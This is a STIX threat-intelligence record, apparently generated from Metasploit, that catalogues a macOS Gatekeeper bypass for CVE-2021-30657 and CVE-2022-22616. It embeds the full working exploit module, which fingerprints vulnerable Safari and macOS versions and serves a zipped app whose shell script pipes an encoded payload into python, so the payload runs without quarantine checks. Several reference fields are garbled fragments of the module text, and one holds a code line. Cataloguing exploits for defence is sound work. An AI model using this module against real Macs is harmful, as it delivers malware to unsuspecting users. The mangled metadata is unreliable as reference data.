{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4fc7ed83-9b4c-45c9-a9a3-ea8bd18a1609",
    "created": "2024-08-14T16:34:24.618944Z",
    "modified": "2024-08-14T16:34:24.618948Z",
    "name": "macOS Gatekeeper check bypass",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/browser/osx_gatekeeper_bypass.rb",
            "external_id": "osx_gatekeeper_bypass.rb"
        },
        {
            "source_name": "ForCVE-2021-30657",
            "external_id": "thismoduleservesanOSXapp(asazip)thatcontainsno"
        },
        {
            "source_name": "ForCVE-2022-22616",
            "external_id": "thismoduleservesagzip-compressedzipfilewithitsfileheaderpointing"
        },
        {
            "source_name": "CedricOwens",
            "external_id": "#CVE-2021-30657Discovery"
        },
        {
            "source_name": "FerdousSaljooki",
            "external_id": "#CVE-2022-22616Discovery(@malwarezoo)"
        },
        {
            "source_name": "JaronBradley",
            "external_id": "#CVE-2022-22616Discovery(@jbradley89)"
        },
        {
            "source_name": "MickeyJin",
            "external_id": "#CVE-2022-22616Discovery(@patch1t)"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-30657"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-22616"
        },
        {
            "source_name": "reference",
            "url": "https://cedowens.medium.com/macos-gatekeeper-bypass-2021-edition-5256a2955508"
        },
        {
            "source_name": "reference",
            "url": "https://objective-see.com/blog/blog_0x64.html"
        },
        {
            "source_name": "reference",
            "url": "https://jhftss.github.io/CVE-2022-22616-Gatekeeper-Bypass/"
        },
        {
            "source_name": "reference",
            "url": "https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/"
        },
        {
            "source_name": "zip.add_file(\"#{app_name}.app/\"",
            "external_id": ")ifcve!=CVE-2022-22616"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'macOS Gatekeeper check bypass',\n        'Description' => %q{\n          This module exploits two CVEs that bypass Gatekeeper.\n\n          For CVE-2021-30657, this module serves an OSX app (as a zip) that contains no\n          Info.plist, which bypasses gatekeeper in macOS < 11.3.\n          If the user visits the site on Safari, the zip file is automatically extracted,\n          and clicking on the downloaded file will automatically launch the payload.\n          If the user visits the site in another browser, the user must click once to unzip\n          the app, and click again in order to execute the payload.\n\n          For CVE-2022-22616, this module serves a gzip-compressed zip file with its file header pointing\n          to the `Contents` directory which contains an OSX app. If the user downloads the file via Safari,\n          Safari will automatically decompress the file, removing its `com.apple.quarantine` attribute.\n          Because of this, the file will not require quarantining, bypassing Gatekeeper on\n          MacOS versions below 12.3.\n        },\n        'License' => MSF_LICENSE,\n        'Targets' => [\n          [ 'macOS x64 (Native Payload)', { 'Arch' => ARCH_X64, 'Platform' => [ 'osx' ] } ],\n          [ 'Python payload', { 'Arch' => ARCH_PYTHON, 'Platform' => [ 'python' ] } ],\n          [ 'Command payload', { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] } ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2021-03-25',\n        'Author' => [\n          'Cedric Owens', # CVE-2021-30657 Discovery\n          'timwr', # Module\n          'Ferdous Saljooki', # CVE-2022-22616 Discovery (@malwarezoo)\n          'Jaron Bradley', # CVE-2022-22616 Discovery (@jbradley89)\n          'Mickey Jin', # CVE-2022-22616 Discovery (@patch1t)\n          'Shelby Pace' # CVE-2022-22616 Additions\n        ],\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]\n        },\n        'References' => [\n          ['CVE', '2021-30657'],\n          ['CVE', '2022-22616'],\n          ['URL', 'https://cedowens.medium.com/macos-gatekeeper-bypass-2021-edition-5256a2955508'],\n          ['URL', 'https://objective-see.com/blog/blog_0x64.html'],\n          ['URL', 'https://jhftss.github.io/CVE-2022-22616-Gatekeeper-Bypass/'],\n          ['URL', 'https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/']\n        ]\n      )\n    )\n    register_options([\n      OptString.new('APP_NAME', [false, 'The application name (Default: app)', 'app']),\n      OptEnum.new('CVE', [true, 'The vulnerability to exploit', 'CVE-2022-22616', ['CVE-2021-30657', 'CVE-2022-22616']])\n    ])\n  end\n\n  def cve\n    datastore['CVE']\n  end\n\n  def check_useragent(user_agent)\n    safari_version = nil\n    if user_agent =~ %r{Version/(\\d+\\.\\d+(\\.\\d+)*)\\sSafari}\n      safari_version = Regexp.last_match(1)\n    end\n\n    if safari_version && Rex::Version.new(safari_version) < Rex::Version.new('15.4') && cve == 'CVE-2022-22616'\n      print_good(\"Safari version #{safari_version} is vulnerable\")\n      return true\n    end\n\n    return false unless user_agent =~ /Intel Mac OS X (.*?)\\)/\n\n    osx_version = Regexp.last_match(1).gsub('_', '.')\n    mac_osx_version = Rex::Version.new(osx_version)\n    if mac_osx_version >= Rex::Version.new('12.3')\n      print_warning \"macOS version #{mac_osx_version} is not vulnerable\"\n    elsif mac_osx_version < Rex::Version.new('10.15.6')\n      print_warning \"macOS version #{mac_osx_version} is not vulnerable\"\n    else\n      print_good \"macOS version #{mac_osx_version} is vulnerable\"\n      return true\n    end\n\n    false\n  end\n\n  def on_request_uri(cli, request)\n    user_agent = request['User-Agent']\n    print_status(\"Request #{request.uri} from #{user_agent}\")\n    unless check_useragent(user_agent)\n      print_error 'Unexpected User-Agent'\n      send_not_found(cli)\n      return\n    end\n\n    app_name = datastore['APP_NAME'] || Rex::Text.rand_text_alpha(5)\n\n    app_file_name = \"#{app_name}.zip\"\n    zipped = app_zip(app_name)\n\n    if cve == 'CVE-2022-22616'\n      zipped = Rex::Text.gzip(zipped)\n      app_file_name = \"#{app_file_name}.gz\"\n    end\n\n    send_response(cli, zipped, { 'Content-Type' => 'application/zip', 'Content-Disposition' => \"attachment; filename=\\\"#{app_file_name}\\\"\" })\n  end\n\n  def app_zip(app_name)\n    case target['Arch']\n    when ARCH_X64\n      payload_data = Msf::Util::EXE.to_python_reflection(framework, ARCH_X64, payload.encoded, {})\n      command = \"echo \\\"#{payload_data}\\\" | python & disown\"\n    when ARCH_PYTHON\n      command = \"echo \\\"#{payload.encoded}\\\" | python\"\n    when ARCH_CMD\n      command = payload.encoded\n    end\n\n    shell_script = <<~SCRIPT\n      #!/bin/sh\n\n      #{command}\n    SCRIPT\n\n    zip = Rex::Zip::Archive.new\n    zip.add_file(\"#{app_name}.app/\", '') if cve != 'CVE-2022-22616'\n    zip.add_file(\"#{app_name}.app/Contents/\", '')\n    zip.add_file(\"#{app_name}.app/Contents/MacOS/\", '')\n    zip.add_file(\"#{app_name}.app/Contents/MacOS/#{app_name}\", shell_script).last.attrs = 0o777\n    zip.pack\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-03-25"
}